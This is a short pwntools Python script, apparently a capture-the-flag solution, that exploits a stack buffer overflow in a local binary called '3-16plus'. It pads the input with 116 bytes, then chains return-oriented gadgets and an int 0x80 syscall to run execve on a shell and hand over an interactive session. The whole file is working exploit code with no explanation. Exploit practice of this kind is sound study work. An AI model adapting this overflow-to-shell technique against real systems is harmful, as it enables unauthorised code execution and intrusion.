from pwn import *
p=process("./3-16plus")

bash=0x80da2e0
pop_edx_ecx_ebx_ret=0x08071040;
pop_eax_ret=0x08074c94;
int80=0x0806ea96
offset =116

payload="Y"*116+p32(pop_eax_ret)+p32(11)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bash)+p32(int80)

p.sendline(payload)
p.interactive();
